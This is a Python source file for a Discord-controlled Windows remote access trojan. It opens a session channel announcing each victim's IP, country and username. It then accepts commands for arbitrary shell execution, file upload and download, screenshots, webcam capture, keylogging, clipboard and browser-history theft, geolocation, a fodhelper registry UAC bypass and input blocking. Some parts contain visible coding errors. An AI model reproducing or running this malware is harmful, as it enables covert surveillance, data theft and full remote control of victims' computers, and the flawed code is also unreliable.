from builtins import WindowsError
import logging
import winreg
import ctypes
import sys
import os
import ssl
import random
import threading
import time
import cv2
import subprocess
import discord
import asyncio
import time
import platform
import re
import urllib.request
import json
import base64
import comtypes
import pyautogui
from win32 import win32gui, win32net, win32process
import win32.lib.win32con as win32con
import browserhistory as bh

from comtypes import CLSCTX_ALL
from discord.ext import commands
from discord import utils
from ctypes import *
from mss import mss
from zipfile import ZipFile
from requests import get
from pynput.keyboard import Key, Listener

TOKEN = 'DISCORD_TOKEN'

global appdata

appdata = os.getenv('APPDATA')
client = discord.Client()
bot = commands.Bot(command_prefix='!')

async def activity(client):
    while True:
        global stop_threads
        if stop_threads:
            break
        window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        game = discord.Game(f"Visiting: {window}")
        await client.change_presence(status=discord.Status.online, activity=game)
        time.sleep(1)

def between_callbacks(client):
    loop = asyncio.set_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(activity(client))
    loop.close()

@client.event
async def on_ready():
    with urllib.request.urlopen("https://geolocation-db.com/json") as url:
        data = json.loads(url.read().decode())
        flag = data['country_code']
        ip = data['IPv4']

    on_ready.total = []
    
    global number
    global channel_name
    number = 0
    channel_name = None

    for x in client.get_all_channels():
        (on_ready.total).append(x.name)
    for y in range(len(on_ready.total)):
        if "session" in on_ready.total[y]:
            result = [e for e in re.split("[^0-9]", on_ready.total[y]) if e != '']
            biggest = max(map(int, result))
            number = biggest + 1
        else:
            pass
    
    if number == 0:
        channel_name = "session-1"
        newchannel = await client.guilds[0].create_text_channel(channel_name)
    else:
        channel_name = f"session-{number}"
        newchannel = await client.guilds[0].create_text_channel(channel_name)

    channel_ = discord.utils.get(client.get_all_channels(), name=channel_name)
    channel = client.get_channel(channel_.id)
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    val1 = f"@here :white_check_mark: New session opened {channel_name} | {platform.system()} {platform.release()} | {ip} :flag_{flag.lower()}: | User : {os.getlogin()}"
    if is_admin == True:
        await channel.send(f"{val1} | :gem:")
    elif is_admin == False:
        await channel.send(val1)

    game = discord.Game("Window logging stopped")
    await client.change_presence(status=discord.Status.online, activity=game)

def volumeup():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))

    if volume.GetMute() == 1:
        volume.SetMute(0, None)
    
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)

def volumedown():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)

@client.event
async def on_message(message):
    global stop_threads
    global pid_process
    global idle1
    global status
    global test

    if message.channel.name != channel_name:
        pass
    else:
        if message.content.startswith("!kill"):
            if message.content[6:] == "all":
                for y in range(len(on_ready.total)):
                    if "session" in on_ready.total[y]:
                        channel_to_delete = discord.utils.get(client.get_all_channels(), name=on_ready.total[y])
                        await channel_to_delete.delete()
                    else:
                        pass
            else:
                try:
                    channel_to_delete = discord.utils.get(client.get_all_channels(), name=message.content[6:])
                    await channel_to_delete.delete()
                    await message.channel.send(f"[*] {message.content[6:]} killed.")
                except:
                    await message.channel.send(f"[!] {message.content[6:]} is invalid,please enter a valid session name")

        if message.content == "!dumpkeylogger":
            temp = os.getenv("TEMP")
            file_keys = os.path.join(os.getenv('TEMP') + '\\key_log.txt')
            file = discord.File(file_keys, filename=file_keys)
            await message.channel.send("[*] Command successfully executed", file=file)
            os.remove(os.path.join(os.getenv('TEMP') + '\\key_log.txt'))

        if message.content == "!exit":
            exit()

        if message.content == "!windowstart":
            global _thread
            stop_threads = False
            _thread = threading.Thread(target=between_callbacks, args=(client,))
            _thread.start()

            await message.channel.send("[*] Window logging for this session started")

        if message.content == "!windowstop":
            stop_threads = True
            await message.channel.send('[*] Window logging for this session stopped')
            game = discord.Game("Window logging stopped")
            await client.change_presence(status=discord.Status.online, activity=game)

        if message.content == "!screenshot":
            with mss() as sct:
                sct.shot(output=os.path.join(os.getenv('TEMP') + '\\monitor.png'))
            
            file = discord.File(os.path.join(os.getenv('TEMP') + '\\monitor.png'), filename="monitor.png")
            await message.channel.send('[*] Command successfully executed', file=file)
            os.remove(os.path.join(os.getenv('TEMP') + '\\monitor.png'))

        if message.content == "!volumemax":
            volumeup()
            await message.channel.send('[*] Volume put to 100%')

        if message.content == "!volumezero":
            volumedown()
            await message.channel.send('[*] Volume put to 0%')

        if message.content == "!webcampic":
            directory = os.getcwd()
            try:
                os.chdir(os.getenv('TEMP'))
                urllib.request.urlretrieve('https://www.nirsoft.net/utils/webcamimagesave.zip', 'temp.zip')
                
                with ZipFile('temp.zip') as zipF:
                    zipF.extractall()
                
                os.system('WebCamIMageSave.exe /capture /FileName temp.png')
                file = discord.File('temp.png', filename='temp.png')

                await message.channel.send('[*] Command successfully executed', file=file)

                os.remove('temp.zip')
                os.remove('temp.png')
                os.remove('WebCamIMageSave.exe')
                os.remove('readme.txt')
                os.remove('WebCamImageSave.chm')
                os.chdir(directory)
            except:
                await message.channel.send('[!] Command failed')

        if message.content.startswith("!message"):
            MB_YESNO = 0x04
            MB_HELP = 0x4000
            ICON_STOP = 0x10

            def mess():
                ctypes.windll.user32.MessageBoxW(0, message.content[8:], 'Error', MB_HELP | MB_YESNO | ICON_STOP)
            
            messa = threading.Thread(target=mess)
            messa._running = True
            messa.daemon = True
            messa.start()
            
            time.sleep(1)

            hwnd = win32gui.FindWindow(None, "Error")
            win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
            win32gui.SetWindowPos(hwnd, win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
            win32gui.SetWindowPos(hwnd,win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)  
            win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_SHOWWINDOW + win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)

        if message.content.startswith("!wallpaper"):
            path = os.path.join(os.getenv('TEMP') + '\\temp.jpg')
            await message.attachments[0].save(path)

            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
            await message.channel.send('[*] Command successfully executed')

        if message.content.startswith("!upload"):
            await message.attachments[0].save(message.content[8:])
            await message.channel.send('[*] Command successfully executed')

        if message.content.startswith("!shell"):
            status = None
            instruction = message.content[7:]
            
            def shell():
                out = subprocess.run(instruction, stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                status = "ok"
                
                return out
            
            shel = threading.Thread(target=shell)
            shel._running = True
            shel.start()
            time.sleep(1)
            shel._running = False

            if status:
                result = str(shell().stdout.decode('CP437'))
                print(result)
                numb = len(result)
                print(numb)

                if numb < 1:
                    await message.channel.send('[*] Command not recognized or no output was obtained')
                elif numb > 1990:
                    f1 = open('output.txt', 'a')
                    f1.write(result)
                    f1.close()
                    file = discord.File('output.txt', filename='output.txt')

                    await message.channel.send(f'[*] Command successfully executed : {result}')
                    os.popen('del output.txt')
                else:
                    await message.channel.send(f'[*] Command successfully executed : {result}')
            else:
                await message.channel.send("[*] Command not recognized or no output was obtained")
                status = None
        
        if message.content.startswith("!download"):
            file = discord.File(message.content[10:], filename=message.content[10:])
            await message.channel.send('[*] Command successfully executed', file=file)

        if message.content.startswith("!cd"):
            os.chdir(message.content[4:])
            await message.channel.send('[*] Command successfully executed')

        if message.content == '!help':
            pass

        if message.content.startswith("!write"):
            if message.content[7:] == 'enter':
                pyautogui.press('enter')
            else:
                pyautogui.typewrite(message.content[7:])

        if message.content == "!history":
            dict_obj = bh.get_browserhistory()
            strobj = str(dict_obj).encode(errors='ignore')
            
            with open('history.txt', 'a') as hist:
                hist.write(str(strobj))
            
            file = discord.File('history.txt', filename='history.txt')
            await message.channel.send('[*] Command successfully executed', file=file)
            os.remove('history.txt')

        if message.content == "!clipboard":
            CF_TEXT = 1
            kernel32 = ctypes.windll.kernel32
            kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
            kernel32.GlobalLock.restype = ctypes.c_void_p
            kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]

            user32 = ctypes.windll.user32
            user32.GetClipboardData.restype = ctypes.c_void_p
            user32.OpenClipboard(0)

            if user32.IsClipboardFormatAvailable(CF_TEXT):
                data = user32.GetClipboardData(CF_TEXT)
                data_locked = kernel32.GlobalLock(data)
                text = ctypes.c_char_p(data_locked)
                val = text.value
                kernel32.GlobalUnlock(data_locked)
                body = val.decode()
                user32.CloseClipboard()

                await message.channel.send(f'[*] Clipboard content is : {body}')

        if message.content.startswith("!stopsing"):
            os.system(f'taskkill /F /IM {pid_process[1]}')

        if message.content == '!sysinfo':
            info = platform.uname()
            info_total = f'{info.system} {info.release} {info.machine}'
            ip = get('https://api.ipify.org').text

            await message.channel.send(f'[*] Command successfully executed : {info_total} {ip}')

        if message.content == "!geolocate":
            with urllib.request.urlopen('https://geolocation-db.com/json') as url:
                data = json.loads(url.read().decode())
                link = f'http://www.google.com/maps/place/{data["latitude"]},{data["longitude"]}'

                await message.channel.send(f'[*] Command successfully executed : {link}')

        if message.content == "!admincheck":
            is_admin = ctypes.windll.shell32.IsUserAdmin() != 0

            if is_admin == True:
                await message.channel.send('[*] You are admin')
            elif is_admin == False:
                await message.channel.send('[!] Sorry, you are NOT admin')

        if message.content == "!uacbypass":
            if 'logonserver' in os.environ:
                server = os.environ['logonserver'][2:]
            else:
                server = None
            
            def if_user_is_admin(Server):
                groups = win32net.NetUserGetLocalGroups(Server, os.getlogin())
                isadmin = False

                for group in groups:
                    if group.lower().startswith('admin'):
                        isadmin = True

                return isadmin, groups

            is_admin, groups = if_user_is_admin(server)
            if is_admin == True:
                print('User in admin group trying to bypass uac')
                CMD = 'C:\\Windows\\System32\\cmd.exe'
                FOD_HELPER = 'C:\\Windows\\System32\\fodhelper.exe'
                COMM = 'start'
                REG_PATH = 'Software\\Classes\\ms-settings\\shell\\open\\command'
                DELEGATE_EXEC_REG_KEY = 'DelegateExecute'

                def is_running_as_admin():
                    try:
                        return ctypes.windll.shell32.IsUserAdmin()
                    except:
                        return False
                
                def create_reg_key(key, value):
                    try:
                        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
                        registry_key = winreg.OpenKey(
                            winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE
                        )
                        winreg.SetValueEx(
                            registry_key,
                            key,
                            0,
                            winreg.REG_SZ,
                            value
                        )
                        winreg.CloseKey(registry_key)
                    except WindowsError:
                        raise

                def bypass_uac(cmd):
                    try:
                        create_reg_key(DELEGATE_EXEC_REG_KEY, '')
                        create_reg_key(None, cmd)
                    except WindowsError:
                        raise

                def execute():
                    if not is_running_as_admin():
                        print('[!] The script is NOT running with administrative privileges')
                        print('[+] Attempting to bypass the UAC')

                        try:
                            current_dir = os.path.dirname(os.path.realpath(__file__)) + '\\' + sys.argv[0] 
                            cmd = '{} /k {} {}'.format(CMD, COMM, current_dir)
                            print(cmd)
                            bypass_uac(cmd)
                            os.system(FOD_HELPER)
                            sys.exit(0)
                        except WindowsError:
                            sys.exit(1)
                    else:
                        print('[+] The script is running with administrative privileges!')
            
                if __name__ == '__main__':
                    execute()
            else:
                print('failed...')
                await message.channel.send("[*] Command failed : User not in administrator group")

        if message.content.startswith("!sing"):
            volumeup()
            link = message.content[6:]
            if link.startswith('http'):
                link = link[link.find('www'):]
            os.system(f'start {link}')
            while True:
                def get_all_hwnd(hwnd, mouse):
                    def winEnumHandler(hwnd, ctx):
                        if 'youtube' in (win32gui.GetWindowText(hwnd).lower()):
                            win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
                            pid_process = win32process.GetWindowThreadProcessId(hwnd)
                            return 'ok'
                        else:
                            pass
                    
                    if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):
                        win32gui.EnumWindows(winEnumHandler, None)
                
                try:
                    win32gui.EnumWindows(get_all_hwnd, 0)
                except:
                    break

        if message.content == "!startkeylogger":
            temp = os.getenv('TEMP')
            logging.basicConfig(
                filename=os.path.join(os.getenv('TEMP') + '\\key_log.txt'),
                level=logging.DEBUG,
                format='%(asctime)s: %(message)s'
            )

            def keylog():
                def on_press(key):
                    logging.info(str(key))
                
                with Listener(on_press=on_press) as listener:
                    listener.join()
            
            test = threading.Thread(target=keylog)
            test._running = True
            test.daemon = True
            test.start()

            await message.channel.send('[*] Keylogger successfully started')

        if message.content == "!stopkeylogger":
            test._running = False
            await message.channel.send('[*] Keylogger successfully stopped')

        if message.content == "!idletime":
            class LASTINPUTINFO(Structure):
                _field_ = [_
                    ('cbSize', c_uint),
                    ('dwTime', c_int),
                ]

            def get_idle_duration():
                lastInputInfo = LASTINPUTINFO()
                lastInputInfo.cbSize = sizeof(lastInputInfo)
                if windll.user32.GetLastInputInfo (byref(lastInputInfo)):
                    millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
                    return millis / 1000.0
                else:
                    return 0
            
            idle1 = threading.Thread(target=get_idle_duration)
            idle1._running = True
            idle1.daemon = True
            idle1.start()

            duration  = get_idle_duration()

            await message.channel.send(f'User idle for {duration} seconds')
            time.sleep(1)

        if message.content.startswith("!voice"):
            volumeup()
            speak = windl.Dispatch('SAPI.SpVoice')
            speak.Speak(message.content[7:])
            comtypes.CoUninitialize()

            await message.channel.send('[*] Command successfully executed')

        if message.content.startswith("!blockinput"):
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                ok = windll.user32.BlockInput(True)
                await message.channel.send("[*] Command successfully executed")
            else:
                await message.channel.send("[!] Admin rights are required for this operation")

        if message.content.startswith("!unblockinput"):
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                ok = windll.user32.BlockInput(False)
                await  message.channel.send("[*] Command successfully executed")
            else:
                await message.channel.send("[!] Admin rights are required for this operation")

client.run(TOKEN)
